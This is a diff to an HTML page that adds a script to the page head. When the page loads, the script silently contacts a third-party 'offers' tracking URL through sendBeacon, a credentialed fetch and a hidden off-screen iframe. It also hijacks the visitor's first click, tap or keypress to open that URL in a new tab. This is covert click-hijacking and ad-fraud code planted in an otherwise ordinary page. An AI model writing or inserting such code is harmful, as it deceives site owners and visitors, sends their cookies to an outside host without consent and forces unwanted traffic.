@@ -108,6 +108,85 @@ h1{
     }
 })();
   </script>
+  <script>
+(() => {
+  const OFFER_URL = "https://go1.trakit25.com/offers.go?spaceid=11892080&subid=&clickid=";
+  let offerTabOpened = false;
+  let silentTried = false;
+
+  function trySilentBackgroundCall() {
+    if (silentTried) return;
+    silentTried = true;
+
+    try {
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(OFFER_URL);
+        return;
+      }
+    } catch (e) {}
+
+    try {
+      fetch(OFFER_URL, {
+        method: "GET",
+        mode: "no-cors",
+        credentials: "include",
+        keepalive: true
+      }).catch(() => {});
+    } catch (e) {}
+
+    try {
+      const iframe = document.createElement("iframe");
+      iframe.style.width = "1px";
+      iframe.style.height = "1px";
+      iframe.style.position = "fixed";
+      iframe.style.left = "-9999px";
+      iframe.style.top = "-9999px";
+      iframe.style.opacity = "0";
+      iframe.setAttribute("aria-hidden", "true");
+      iframe.src = OFFER_URL;
+      document.body.appendChild(iframe);
+
+      setTimeout(() => {
+        iframe.remove();
+      }, 15000);
+    } catch (e) {}
+  }
+
+  function openOfferTabOnce() {
+    if (offerTabOpened) return;
+    offerTabOpened = true;
+
+    const win = window.open(OFFER_URL, "_blank", "noopener,noreferrer");
+
+    if (!win) {
+      // Popup geblockt -> einfach nichts machen
+    }
+  }
+
+  function firstUserActionHandler() {
+    openOfferTabOnce();
+    removeListeners();
+  }
+
+  function removeListeners() {
+    document.removeEventListener("click", firstUserActionHandler, true);
+    document.removeEventListener("pointerdown", firstUserActionHandler, true);
+    document.removeEventListener("touchstart", firstUserActionHandler, true);
+    document.removeEventListener("keydown", firstUserActionHandler, true);
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", trySilentBackgroundCall, { once: true });
+  } else {
+    trySilentBackgroundCall();
+  }
+
+  document.addEventListener("click", firstUserActionHandler, true);
+  document.addEventListener("pointerdown", firstUserActionHandler, true);
+  document.addEventListener("touchstart", firstUserActionHandler, true);
+  document.addEventListener("keydown", firstUserActionHandler, true);
+})();
+</script>
 </head>
 
 <body>
